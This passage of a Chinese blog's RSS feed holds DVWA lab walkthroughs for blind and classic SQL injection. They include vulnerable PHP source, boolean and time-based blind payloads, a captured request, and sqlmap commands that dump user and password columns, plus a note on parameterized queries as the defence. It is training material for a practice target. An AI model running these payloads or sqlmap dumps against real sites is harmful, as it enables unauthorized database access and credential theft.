+</span></span></span><span class="line"><span class="cl">		<span class="nv">$html</span> <span class="o">.=</span> <span class="s1">&#39;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="c1">//mysql_close();
+</span></span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>将DVWA Security调整到Medium级别，发现原本提交数据的文本框变成了下拉列表，需要使用Burp Suite抓包修改提交数据。同时，源代码中使用mysqli_real_escape_string()函数防范SQL注入，mysqli_real_escape_string()函数会转义字符串中的特殊字符，如 \x00、\n、\r、\、&rsquo;、&rdquo; 和 \x1a。</p>
+<p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424598.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424598.png" 
+             alt="image-20240509094258008" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
+<p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424599.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424599.png" 
+             alt="image-20240509094324275" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
+<p>虽然单引号在Medium级别中被转义，但我们可以使用ASCII码值来代替原来单引号括起来的字符。ascii() 函数可以将字符转换成 ASCII码值，然后我们同样把版本号的各个字符提取出来，然后和 0 ~ 9 和 “.” 11 个字符的 ASCII码值作比较。例如注入如下内容，可以测试出版本号第一个字符为 “5”。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">1 and ascii(substr((select version()), 1, 1)) = 53#
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424600.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424600.png" 
+             alt="image-20240509101517241" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">0 ~ 9 和 “.” 11 个字符的 ASCII码值
+</span></span><span class="line"><span class="cl">. --&gt; 46
+</span></span><span class="line"><span class="cl">0 --&gt; 48
+</span></span><span class="line"><span class="cl">1 --&gt; 49
+</span></span><span class="line"><span class="cl">2 --&gt; 50
+</span></span><span class="line"><span class="cl">3 --&gt; 51
+</span></span><span class="line"><span class="cl">4 --&gt; 52
+</span></span><span class="line"><span class="cl">5 --&gt; 53
+</span></span><span class="line"><span class="cl">6 --&gt; 54
+</span></span><span class="line"><span class="cl">7 --&gt; 55
+</span></span><span class="line"><span class="cl">8 --&gt; 56
+</span></span><span class="line"><span class="cl">9 --&gt; 57
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>时间盲注也是需要加上ascii() 函数，用ascii码值进行判断。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">1 and if(ascii(substr((select version()), 1, 1)) = 53, sleep(3), 1)#
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424601.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424601.png" 
+             alt="image-20240509102055721" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
+<p><strong>布尔盲注代码</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">1 and length(substr((version()), 1)) = 6#
+</span></span><span class="line"><span class="cl">1 and ascii(substr((select version()), 1, 1)) = 53#
+</span></span><span class="line"><span class="cl">1 and ascii(substr((select version()), 2, 1)) = 46#
+</span></span><span class="line"><span class="cl">1 and ascii(substr((select version()), 3, 1)) = 55#
+</span></span><span class="line"><span class="cl">1 and ascii(substr((select version()), 4, 1)) = 46#
+</span></span><span class="line"><span class="cl">1 and ascii(substr((select version()), 5, 1)) = 50#
+</span></span><span class="line"><span class="cl">1 and ascii(substr((select version()), 6, 1)) = 54#
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>时间盲注代码</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">1 and if(length(substr((version()), 1)) = 6, sleep(3), 1)#
+</span></span><span class="line"><span class="cl">1 and if(ascii(substr((select version()), 1, 1)) = 53, sleep(3), 1)#
+</span></span><span class="line"><span class="cl">1 and if(ascii(substr((select version()), 2, 1)) = 46, sleep(3), 1)#
+</span></span><span class="line"><span class="cl">1 and if(ascii(substr((select version()), 3, 1)) = 55, sleep(3), 1)#
+</span></span><span class="line"><span class="cl">1 and if(ascii(substr((select version()), 4, 1)) = 46, sleep(3), 1)#
+</span></span><span class="line"><span class="cl">1 and if(ascii(substr((select version()), 5, 1)) = 50, sleep(3), 1)#
+</span></span><span class="line"><span class="cl">1 and if(ascii(substr((select version()), 6, 1)) = 54, sleep(3), 1)#
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="high">High</h2>
+<p>0、分析网页源代码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span> <span class="nx">isset</span><span class="p">(</span> <span class="nv">$_COOKIE</span><span class="p">[</span> <span class="s1">&#39;id&#39;</span> <span class="p">]</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="c1">// Get input
+</span></span></span><span class="line"><span class="cl">	<span class="nv">$id</span> <span class="o">=</span> <span class="nv">$_COOKIE</span><span class="p">[</span> <span class="s1">&#39;id&#39;</span> <span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="c1">// Check database
+</span></span></span><span class="line"><span class="cl">	<span class="nv">$getid</span>  <span class="o">=</span> <span class="s2">&#34;SELECT first_name, last_name FROM users WHERE user_id = &#39;</span><span class="si">$id</span><span class="s2">&#39; LIMIT 1;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="nv">$result</span> <span class="o">=</span> <span class="nx">mysqli_query</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s2">&#34;___mysqli_ston&#34;</span><span class="p">],</span>  <span class="nv">$getid</span> <span class="p">);</span> <span class="c1">// Removed &#39;or die&#39; to suppress mysql errors
+</span></span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="c1">// Get results
+</span></span></span><span class="line"><span class="cl">	<span class="nv">$num</span> <span class="o">=</span> <span class="o">@</span><span class="nx">mysqli_num_rows</span><span class="p">(</span> <span class="nv">$result</span> <span class="p">);</span> <span class="c1">// The &#39;@&#39; character suppresses errors
+</span></span></span><span class="line"><span class="cl">	<span class="k">if</span><span class="p">(</span> <span class="nv">$num</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="c1">// Feedback for end user
+</span></span></span><span class="line"><span class="cl">		<span class="nv">$html</span> <span class="o">.=</span> <span class="s1">&#39;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="c1">// Might sleep a random amount
+</span></span></span><span class="line"><span class="cl">		<span class="k">if</span><span class="p">(</span> <span class="nx">rand</span><span class="p">(</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">5</span> <span class="p">)</span> <span class="o">==</span> <span class="mi">3</span> <span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="nx">sleep</span><span class="p">(</span> <span class="nx">rand</span><span class="p">(</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">4</span> <span class="p">)</span> <span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">		<span class="c1">// User wasn&#39;t found, so the page wasn&#39;t!
+</span></span></span><span class="line"><span class="cl">		<span class="nx">header</span><span class="p">(</span> <span class="nv">$_SERVER</span><span class="p">[</span> <span class="s1">&#39;SERVER_PROTOCOL&#39;</span> <span class="p">]</span> <span class="o">.</span> <span class="s1">&#39; 404 Not Found&#39;</span> <span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">		<span class="c1">// Feedback for end user
+</span></span></span><span class="line"><span class="cl">		<span class="nv">$html</span> <span class="o">.=</span> <span class="s1">&#39;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="p">((</span><span class="nx">is_null</span><span class="p">(</span><span class="nv">$___mysqli_res</span> <span class="o">=</span> <span class="nx">mysqli_close</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s2">&#34;___mysqli_ston&#34;</span><span class="p">])))</span> <span class="o">?</span> <span class="k">false</span> <span class="o">:</span> <span class="nv">$___mysqli_res</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">//代码通过LIMIT 1限制SQL查询结果，使用Cookie传参，并在查询无结果时执行sleep()，以此来混淆时间盲注判断，提高了SQL注入攻击门槛
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>由于查询无结果时，服务器会等待一段时间，混淆时间盲注判断，所以我们使用布尔盲注。尽管源代码中使用 <code>LIMIT 1</code> 语句限制查询结果，但可以通过’#&lsquo;注释掉，没有影响。与Low级别的布尔盲注攻击方法一致。</p>
+<p><strong>SqlMap使用</strong></p>
+<p>1、在网页提交一个参数，使用Burp Suite抓包，将抓包内容保存在一个.txt文本（1.txt）。抓包内容如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">POST /vulnerabilities/sqli_blind/cookie-input.php HTTP/1.1
+</span></span><span class="line"><span class="cl">Host: dvwa
+</span></span><span class="line"><span class="cl">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0
+</span></span><span class="line"><span class="cl">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+</span></span><span class="line"><span class="cl">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+</span></span><span class="line"><span class="cl">Accept-Encoding: gzip, deflate
+</span></span><span class="line"><span class="cl">Content-Type: application/x-www-form-urlencoded
+</span></span><span class="line"><span class="cl">Content-Length: 18
+</span></span><span class="line"><span class="cl">Origin: http://dvwa
+</span></span><span class="line"><span class="cl">Connection: close
+</span></span><span class="line"><span class="cl">Referer: http://dvwa/vulnerabilities/sqli_blind/cookie-input.php
+</span></span><span class="line"><span class="cl">Cookie: id=1; PHPSESSID=r25rluk5p6u15do5hvba9airl1; security=high
+</span></span><span class="line"><span class="cl">Upgrade-Insecure-Requests: 1
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">id=1&amp;Submit=Submit
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>在SqlMap中，使用如下语句，探测出Apache、PHP、MySQL版本号。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sqlmap -r &#34;文件地址&#34; --second-url &#34;回显页面URL&#34; --batch
+</span></span><span class="line"><span class="cl">sqlmap -r &#34;C:\1.txt&#34; --second-url &#34;http://dvwa/vulnerabilities/sqli_blind/&#34; --batch
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424602.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424602.png" 
+             alt="image-20240509175037711" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
+<p>盲注有点慢，反而对猜测的过程有更直观的认识了。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sqlmap -r &#34;C:\Users\yuexuan\Desktop\1.txt&#34; --second-url &#34;http://dvwa/vulnerabilities/sqli_blind/&#34; --batch --dbs
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424603.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424603.png" 
+             alt="image-20240509175153935" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sqlmap -r &#34;C:\Users\yuexuan\Desktop\1.txt&#34; --second-url &#34;http://dvwa/vulnerabilities/sqli_blind/&#34; --batch -D dvwa --tables
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424604.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424604.png" 
+             alt="image-20240509175349013" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sqlmap -r &#34;C:\Users\yuexuan\Desktop\1.txt&#34; --second-url &#34;http://dvwa/vulnerabilities/sqli_blind/&#34; --batch -D dvwa -T users --columns
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424605.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424605.png" 
+             alt="image-20240509175850523" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sqlmap -r &#34;C:\Users\yuexuan\Desktop\1.txt&#34; --second-url &#34;http://dvwa/vulnerabilities/sqli_blind/&#34; --batch -D dvwa -T users -C user,password --dump
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="impossible">Impossible</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span> <span class="nx">isset</span><span class="p">(</span> <span class="nv">$_GET</span><span class="p">[</span> <span class="s1">&#39;Submit&#39;</span> <span class="p">]</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="c1">// Check Anti-CSRF token
+</span></span></span><span class="line"><span class="cl">	<span class="nx">checkToken</span><span class="p">(</span> <span class="nv">$_REQUEST</span><span class="p">[</span> <span class="s1">&#39;user_token&#39;</span> <span class="p">],</span> <span class="nv">$_SESSION</span><span class="p">[</span> <span class="s1">&#39;session_token&#39;</span> <span class="p">],</span> <span class="s1">&#39;index.php&#39;</span> <span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="c1">// Get input
+</span></span></span><span class="line"><span class="cl">	<span class="nv">$id</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span> <span class="s1">&#39;id&#39;</span> <span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="c1">// Was a number entered?
+</span></span></span><span class="line"><span class="cl">	<span class="k">if</span><span class="p">(</span><span class="nx">is_numeric</span><span class="p">(</span> <span class="nv">$id</span> <span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="c1">// Check the database
+</span></span></span><span class="line"><span class="cl">		<span class="nv">$data</span> <span class="o">=</span> <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span> <span class="s1">&#39;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&#39;</span> <span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$data</span><span class="o">-&gt;</span><span class="na">bindParam</span><span class="p">(</span> <span class="s1">&#39;:id&#39;</span><span class="p">,</span> <span class="nv">$id</span><span class="p">,</span> <span class="nx">PDO</span><span class="o">::</span><span class="na">PARAM_INT</span> <span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$data</span><span class="o">-&gt;</span><span class="na">execute</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">		<span class="c1">// Get results
+</span></span></span><span class="line"><span class="cl">		<span class="k">if</span><span class="p">(</span> <span class="nv">$data</span><span class="o">-&gt;</span><span class="na">rowCount</span><span class="p">()</span> <span class="o">==</span> <span class="mi">1</span> <span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="c1">// Feedback for end user
+</span></span></span><span class="line"><span class="cl">			<span class="nv">$html</span> <span class="o">.=</span> <span class="s1">&#39;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">		<span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="c1">// User wasn&#39;t found, so the page wasn&#39;t!
+</span></span></span><span class="line"><span class="cl">			<span class="nx">header</span><span class="p">(</span> <span class="nv">$_SERVER</span><span class="p">[</span> <span class="s1">&#39;SERVER_PROTOCOL&#39;</span> <span class="p">]</span> <span class="o">.</span> <span class="s1">&#39; 404 Not Found&#39;</span> <span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">			<span class="c1">// Feedback for end user
+</span></span></span><span class="line"><span class="cl">			<span class="nv">$html</span> <span class="o">.=</span> <span class="s1">&#39;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// Generate Anti-CSRF token
+</span></span></span><span class="line"><span class="cl"><span class="nx">generateSessionToken</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div>]]></content:encoded>
+    </item>
+    <item>
+      <title>网络安全 DVWA通关指南 SQL Injection(SQL注入)</title>
+      <link>https://yuexuan521.github.io/zh/posts/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8-dvwa%E9%80%9A%E5%85%B3%E6%8C%87%E5%8D%97-sql-injectionsql%E6%B3%A8%E5%85%A5/</link>
+      <pubDate>Fri, 20 Sep 2024 12:25:03 +0000</pubDate>
+      <guid>https://yuexuan521.github.io/zh/posts/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8-dvwa%E9%80%9A%E5%85%B3%E6%8C%87%E5%8D%97-sql-injectionsql%E6%B3%A8%E5%85%A5/</guid>
+      <description>&lt;h2 id=&#34;dvwasqlinjection&#34;&gt;DVWASQLInjection&lt;/h2&gt;
+&lt;p&gt;
+&lt;div class=&#34;post-img-view&#34;&gt;
+    &lt;a data-fancybox=&#34;gallery&#34; href=&#34;https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735688.jpeg&#34;&gt;
+        &lt;img src=&#34;https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735688.jpeg&#34; 
+             alt=&#34;在这里插入图片描述&#34; 
+              
+             loading=&#34;lazy&#34;
+        /&gt;
+    &lt;/a&gt;
+&lt;/div&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;参考文献&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://www.cnblogs.com/linfangnan/p/13994655.html#dvwa-%E9%9D%B6%E5%9C%BA&#34;target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt;WEB 安全靶场通关指南&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;strong&gt;SQL注入漏洞基本原理&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Web应用程序对用户输入的数据校验处理不严或者根本没有校验，致使用户可以拼接执行SQL命令。&lt;/p&gt;</description>
+      <content:encoded><![CDATA[<h2 id="dvwasqlinjection">DVWASQLInjection</h2>
+<p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735688.jpeg">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735688.jpeg" 
+             alt="在这里插入图片描述" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
+<hr>
+<p>参考文献</p>
+<ul>
+<li><a href="https://www.cnblogs.com/linfangnan/p/13994655.html#dvwa-%E9%9D%B6%E5%9C%BA"target="_blank" rel="noopener noreferrer">WEB 安全靶场通关指南</a></li>
+</ul>
+<hr>
+<blockquote>
+<p><strong>SQL注入漏洞基本原理</strong></p>
+<p>Web应用程序对用户输入的数据校验处理不严或者根本没有校验，致使用户可以拼接执行SQL命令。</p>
+<p>可能导致数据泄露或数据破坏，缺乏可审计性，甚至导致完全接管主机。</p>
+<p><strong>根据注入技术分类有以下五种：</strong></p>
+<blockquote>
+<p>布尔型盲注：根据返回页面判断条件真假</p>
+<p>时间型盲注：用页面返回时间是否增加判断是否存在注入</p>
+<p>基于错误的注入：页面会返回错误信息</p>
+<p>联合查询注入：可以使用union的情况下</p>
+<p>堆查询注入：可以同时执行多条语句</p>
+</blockquote>
+<p><strong>防御方法</strong></p>
+<p>使用参数化查询。</p>
+<p>数据库服务器不会把参数的内容当作 <code>SQL</code> 指令的一部分来拼接执行；</p>
+<p>而是在数据库完成 <code>SQL</code> 指令的编译后才套用参数运行(预编译)。</p>
+<p>避免数据变成代码被执行，时刻分清代码和数据的界限。</p>
+</blockquote>
+<h3 id="low">Low</h3>
+<p><strong>一、判断提交方式</strong></p>
+<p>在User ID中输入数字1，提交后发现，在URL地址栏出现了提交的参数，由此可以判断提交方式为get方式。</p>
+<p>提问：get和post提交方式对SQL注入的实施有什么影响？</p>
+<p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735689.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735689.png" 
+             alt="image-20240408153605723" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
+<p><strong>二、判断服务器处理类型（数字型或字符型）</strong></p>
+<p>加单引号，提交 <code>1'</code> ，出现报错信息，显示多出一个单引号，可以确定为字符型注入</p>
+<p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735690.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735690.png" 
+             alt="image-20240411212414415" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
+<p><strong>三、判断注入点</strong></p>
+<p>提交 <code>1' or 1=1#</code> 语句，结果返回了全部的内容，可以判断存在注入点</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
